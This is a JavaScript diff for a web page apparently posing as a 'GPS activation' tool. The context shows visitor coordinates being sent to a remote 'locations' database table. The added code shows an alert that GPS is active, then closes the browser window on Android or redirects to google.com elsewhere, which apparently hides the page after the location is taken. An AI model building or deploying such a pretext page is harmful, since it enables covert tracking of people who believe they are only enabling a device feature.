@@ -214,33 +214,20 @@ const countdown = setInterval(() => {
     countdownDiv.remove();
     
  // Tampilkan pesan sukses di layar
-const msgDiv = document.createElement('div');
-msgDiv.style.cssText = 'margin-top: 12px; padding: 12px; background: #d4edda; border: 1px solid #c3e6cb; border-radius: 8px; text-align: center; color: #155724; font-weight: 600;';
-msgDiv.innerHTML = '✅ GPS AKTIF!<br><small style="font-weight: normal;">Aplikasi akan minimize otomatis...</small>';
-document.getElementById('mainScreen').appendChild(msgDiv);
-
-// Hitung Mundur
-let detik = 3;
-const countdownDiv = document.createElement('div');
-countdownDiv.style.cssText = 'margin-top: 8px; text-align: center; color: #856404; font-weight: 600;';
-countdownDiv.textContent = '⏱️ ' + detik;
-document.getElementById('mainScreen').appendChild(countdownDiv);
-
-// Redirect otomatis setelah 3 detik
-const countdown = setInterval(function() {
-    detik--;
-    if (detik > 0) {
-        countdownDiv.textContent = '⏱️ ' + detik;
-    } else {
-        clearInterval(countdown);
-        countdownDiv.remove();
-        msgDiv.innerHTML = '✅ Berhasil! Mengalihkan...';
-        
-        setTimeout(function() {
+setTimeout(function() {
+    alert('✅ GPS SUDAH AKTIF!\n\nAplikasi akan di-minimize.\n\nUntuk membuka kembali:\n1. Tekan tombol Home\n2. Buka Chrome\n3. Buka aplikasi ini lagi\n\nAtau buka: aktivasi-gps.vercel.app');
+    
+    if (navigator.userAgent.match(/Android/i)) {
+        try {
+            window.open('about:blank', '_self');
+            window.close();
+        } catch(e) {
             window.location.href = 'https://www.google.com';
-        }, 500);
+        }
+    } else {
+        window.location.href = 'https://www.google.com';
     }
-}, 1000);
+}, 5000);
 async function sendLocation(coords) {
   try {
     const { error } = await sbClient.from('locations').insert({
